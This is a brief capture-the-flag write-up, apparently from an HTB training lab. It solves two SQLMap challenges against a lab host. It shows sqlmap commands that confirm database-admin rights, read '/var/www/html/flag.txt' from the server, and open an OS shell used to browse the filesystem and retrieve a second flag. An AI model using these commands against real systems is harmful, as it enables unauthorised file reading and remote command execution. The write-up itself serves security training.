## Challenge 1

Try to use SQLMap to read the file "/var/www/html/flag.txt". 

## Solution 1

The page gives us this URL:

```url
http://94.237.55.96:57458/?id=1
```

Let's first check if we have DBA:

```sh
python3 sqlmap.py -u "http://94.237.55.96:57458/?id=1" --is-dba
```

And the response is `current user is DBA: True`.

Now let's try to read the file.

```sh
python3 sqlmap.py -u "http://94.237.55.96:57458/?id=1" --file-read="/var/www/html/flag.txt"
```

And it tells me that:

```sh
files saved to [1]:
[*] /home/hb/.local/share/sqlmap/output/94.237.55.96/files/_var_www_html_flag.txt (same file)
```

and I read the file using cat:

```sh
cat /home/hb/.local/share/sqlmap/output/94.237.55.96/files/_var_www_html_flag.txt 
```
which gives me the flag `HTB{5up3r_u53r5_4r3_p0w3rful!}`.

## Challenge 2

Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host. 

## Solution 2

Since we have DBA I will execute this command to get the OS Command Exectution:

```sh
python3 sqlmap.py -u "http://94.237.55.96:57458/?id=1" --os-shell --technique=E
```

This provided me with the shell, and i moved around the host to search for the flag.

When I executed:

```sh
ls ../../../
``` 

it gave me:
```sh
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

So I read the flag.txt:

```sh
cat ../../../flag.txt
```

and it is:

```sh
HTB{n3v3r_run_db_45_db4}
```
